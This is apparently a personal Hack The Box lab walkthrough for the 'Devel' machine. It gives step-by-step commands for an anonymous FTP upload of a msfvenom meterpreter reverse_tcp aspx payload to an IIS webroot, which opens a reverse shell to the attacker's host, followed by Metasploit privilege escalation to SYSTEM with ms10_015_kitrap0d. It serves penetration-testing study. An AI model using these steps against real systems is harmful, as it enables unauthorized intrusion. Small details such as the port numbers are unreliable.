HTB - 4. Devel

1. `nmap -T4 -p- -A 10.10.10.5` shows 22 (FTP) with anonymous login (to webroot directory?), 80 (HTTP) with  Microsoft IIS httpd 7.5
2. Go to `10.10.10.5` which is a default web page
3. `dirbuster` (`dirb` and `gobuster` popular as well) with `http://10.10.10.5:80`, wordlist `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`, and change file-extension to `asm, asmx, asp, aspx, txt` because server is IIS
4. FTP: upload file to server
	```
	ftp 10.10.10.5
	anonymous
	anonymous
	ls
	pwd
	put dog.jpg
	ls
	```
	Go to `10.10.10.5/dog.jpg` and it executes.
	
5. `msfvenom`
	* [msfvenom cheatsheet 1](https://netsec.ws/?p=331)
	* [msfvenom cheatsheet 2](https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/)
	
	Create `reverse_tcp` payload:
	```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > ex.aspx
	```
	
	Open up port to listen on:
	```
	sudo msfconsole
	use exploit/multi/handler
	options
	set payload windows/meterpreter/reverse_tcp
	options
	set LHOST 10.10.14.24
	run
	```
6. Back to FTP
	```
	binary <-- swith to binary instead of ascii
	put ex.aspx
	```
	Go to `10.10.10.5/ex.aspx` and shell popped
7. Hacked
	```
	sysinfo
	getuid
	```
	Result: We are `IIS APPPOOL\Web` not authority system.
	`getsystem` failed.
	
	Check to see which privilege escalation exploits might work:
	```
	background
	search suggester
	use post/multi/recon/local_exploit_suggester
	options
	set SESSION 1
	run
	```
	
	Run privilege escalation
	```
	use exploit/windows/local/ms10_015_kitrap0d
	options
	set SESSION 1
	options
	run
	options
	set lhost 10.10.14.24 <-- make sure using the right interface
	set lport 4445 <-- Need to use different port since 4445 already in use
	options
	run
	```
	Result: Shell popped with authority system
	
	



